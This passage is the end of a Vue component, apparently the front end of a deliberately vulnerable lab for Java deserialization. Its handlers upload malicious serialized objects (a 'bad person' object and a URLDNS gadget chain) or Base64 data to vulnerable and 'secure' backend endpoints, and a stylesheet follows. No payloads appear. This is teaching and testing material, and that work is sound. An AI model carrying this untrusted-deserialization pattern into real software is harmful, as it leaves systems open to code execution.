        this.deserializeResult = '错误: ' + (error.response?.data?.message || error.message)
        this.$message.error('反序列化失败')
      }
    },

    // 测试恶意对象反序列化 (通过文件上传)
    async testBadPersonDeserialize() {
      if (!this.selectedBadPersonFile) {
        this.$message.warning('请先选择恶意对象序列化文件')
        return
      }
      try {
        const formData = new FormData()
        formData.append('file', this.selectedBadPersonFile, 'badPerson.ser')
        const response = await deserializeBadPerson(formData) // 调用恶意对象反序列化接口
        this.maliciousResult = response.data
        this.$message.success('恶意对象反序列化测试成功')
      } catch (error) {
        this.maliciousResult = '错误: ' + (error.response?.data?.message || error.message)
        this.$message.error('恶意对象反序列化测试失败')
      }
    },

    // 测试URLDNS链反序列化
    async testUrlDnsDeserialize() {
      if (!this.selectedUrlDnsFile) {
        this.$message.warning('请先选择URLDNS链序列化文件')
        return
      }
      try {
        const formData = new FormData()
        formData.append('file', this.selectedUrlDnsFile, 'urldns.ser')
        const response = await deserializeURLDNS(formData) // 调用URLDNS链反序列化接口
        this.urldnsResult = response.data
        this.$message.success('URLDNS链反序列化测试成功')
      } catch (error) {
        this.urldnsResult = '错误: ' + (error.response?.data?.message || error.message)
        this.$message.error('URLDNS链反序列化测试失败')
      }
    },

    // 测试Base64反序列化
    async testBase64Deserialize() {
      if (!this.base64Form.data.trim()) {
        this.$message.warning('请输入Base64数据')
        return
      }
      try {
        const response = await base64Deserialize(this.base64Form.data)
        this.base64Result = JSON.stringify(response.data, null, 2)
        this.$message.success('Base64反序列化测试成功')
      } catch (error) {
        this.base64Result = '错误: ' + error.message
        this.$message.error('Base64反序列化测试失败')
      }
    },

    // 测试安全反序列化
    async testSecureDeserialize() {
      if (!this.base64Form.data.trim()) {
        this.$message.warning('请输入Base64数据')
        return
      }
      try {
        const response = await secureDeserialize(this.base64Form.data)
        this.base64Result = JSON.stringify(response.data, null, 2)
        this.$message.success('安全反序列化测试成功')
      } catch (error) {
        this.base64Result = '错误: ' + error.message
        this.$message.error('安全反序列化测试失败')
      }
    },


  }
}
</script>

<style>
.vuln-info {
    border-radius: 10px;
    margin-left: 20px;
    margin-right: 20px;
    margin-bottom: 20px;
    margin-top: 10px;
}

.header-div {
    font-size: 24px;
    color: #409EFF;
    font-weight: bold;
    padding: 10px;
    justify-content: center;
    align-items: center;
    border-bottom: 1px solid #ccc;
}

.body-div {
    padding: 10px;
    justify-content: center;
    align-items: center;
    font-family: Arial, sans-serif;
    font-size: 14px;
}

.vuln-detail {
    background-color: #dce9f8;
    padding: 10px;
}

.code-demo {
    margin: 20px;
    border-top: 1px solid #ccc;
    padding-top: 20px;
}

pre code {
    font-size: 12px;
}

.el-row {
    margin-bottom: 20px;
}

.el-row:last-child {
    margin-bottom: 0;
}

.el-col {
    border-radius: 4px;
}

.bg-purple-dark {
    background: #99a9bf;
}

.bg-purple {
    background: #d3dce6;
}

.bg-purple-light {
    background: #e5e9f2;
}

.grid-content {
    border-radius: 4px;
    height: 100%;
    padding: 10px;
}

.grid-flex {
    display: flex;
    align-items: stretch;
}

.row-bg {
    padding: 10px 0;
    background-color: #f9fafc;
}

.center-dialog {
    text-align: center;
    margin: 0 auto;
}

.center-dialog-table {
    text-align: center;
}

/* 让标签页居中显示 */
.center-dialog .el-tabs__header {
    text-align: center;
}

.center-dialog .el-tabs__nav-wrap {
    text-align: center;
}

.center-dialog .el-tabs__nav {
    float: none;
    display: inline-block;
}
</style> 